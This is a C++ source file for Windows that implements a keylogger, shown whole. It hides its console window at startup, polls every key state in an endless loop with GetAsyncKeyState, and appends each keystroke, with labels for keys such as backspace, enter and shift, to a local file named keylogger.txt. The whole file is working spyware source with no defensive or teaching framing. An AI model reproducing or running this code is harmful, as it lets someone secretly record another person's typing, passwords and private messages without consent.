#include <iostream>
#include <windows.h>
#include <fstream>
#include <tchar.h>
using namespace std;
using std::string;
void add_key(char key);
void keylogger();
int main(){
     ShowWindow(GetConsoleWindow(), SW_HIDE);
	 keylogger();
    return(0);
}
//functions

void add_key(char key){
	 ofstream keylogger;
     keylogger.open("keylogger.txt", ios::app);
	 switch (key) {
                    case VK_BACK:
                        keylogger << "[backspace]";
                        break;
                    case VK_RETURN:
                        keylogger << "[enter]";
                        break;
                    case VK_SHIFT:
                        keylogger << "[shift]";
                        break;
                    case VK_CONTROL:
                        keylogger << "[control]";
                        break;
                    case VK_CAPITAL:
                    keylogger<< "[cap]";
                        break;
                    case VK_TAB:
                        keylogger << "[tab]";
                        break;
                    case VK_MENU:
                        keylogger << "[alt]";
                    case VK_LBUTTON:
                    case VK_RBUTTON:
                        break;
                    case VK_NUMPAD0:
                        keylogger << "0";
				        break;
                    case VK_NUMPAD1:
                       keylogger << "1";
				        break;
			        case VK_NUMPAD2:
				        keylogger << "2";
				        break;
			        case VK_NUMPAD3:
				       keylogger << "3";
				        break;
			        case VK_NUMPAD4:
				        keylogger << "4";
				        break;
			        case VK_NUMPAD5:
				        keylogger << "5";
				        break;
			        case VK_NUMPAD6:
				        keylogger << "6";
				        break;
			        case VK_NUMPAD7:
				        keylogger << "7";
				        break;
			        case VK_NUMPAD8:
				        keylogger << "8";
				        break;
			        case VK_NUMPAD9:
				        keylogger << "9";
				        break;
                    default:
                        keylogger << key;
                }
			keylogger.close();
}

void keylogger(){
	char key;
    while (true) {
        for(key=1;key<=254;key++){
            if(GetAsyncKeyState(key)) 
            {
                add_key(key);
            }
        }
    }
}